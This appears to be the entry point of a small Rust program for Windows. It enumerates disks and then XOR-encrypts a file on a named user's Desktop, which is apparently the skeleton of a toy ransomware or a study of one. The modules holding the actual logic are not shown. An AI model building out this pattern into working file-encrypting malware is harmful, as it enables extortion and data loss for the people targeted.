extern crate winapi;
mod disk_enum;
mod XOR_encrypt;
use disk_enum::disk_enum;
use XOR_encrypt::XOR_encrypt;


fn main() {unsafe {

        disk_enum();
        XOR_encrypt("C:\\Users\\Rami\\Desktop\\chris.txt");
    }
   } 
  
